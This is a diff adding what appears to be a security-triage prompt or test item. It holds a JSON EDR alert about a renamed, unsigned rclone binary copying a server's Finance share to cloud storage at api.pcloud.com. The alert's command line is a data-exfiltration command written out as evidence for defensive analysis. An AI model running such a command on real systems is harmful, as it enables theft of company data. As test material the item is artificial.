@@ -1,0 +1,24 @@
+Triage this alert:
+
+EDR ALERT (JSON)
+{
+  "detection_name": "Large upload by cloud sync tool",
+  "severity": "Medium",
+  "timestamp": "2026-07-01T23:55:01Z",
+  "device": {
+    "hostname": "SRV-FILE07",
+    "device_group": "File Servers",
+    "os": "Windows Server 2022"
+  },
+  "user": "CORP\\adm-gtanaka",
+  "process": {
+    "image": "C:\\ProgramData\\svchosts.exe",
+    "command_line": "svchosts.exe copy \\\\SRV-FILE07\\Finance remote:data --transfers 16 --ignore-existing --config C:\\ProgramData\\rc.conf -q",
+    "ancestry": "C:\\Windows\\System32\\cmd.exe <- C:\\ProgramData\\xptjgf.exe",
+    "signature": "Unsigned (original filename rclone.exe)",
+    "prevalence": "Image seen on 1 host in last 30 days",
+    "sha256": "3c9aa97985d16861fec6c24aeff0066cf52153731b4a4138c58f74de12cd8030"
+  },
+  "network": "204 GB uploaded to api.pcloud.com over 2 hours",
+  "context": "First execution of this file in the environment"
+}
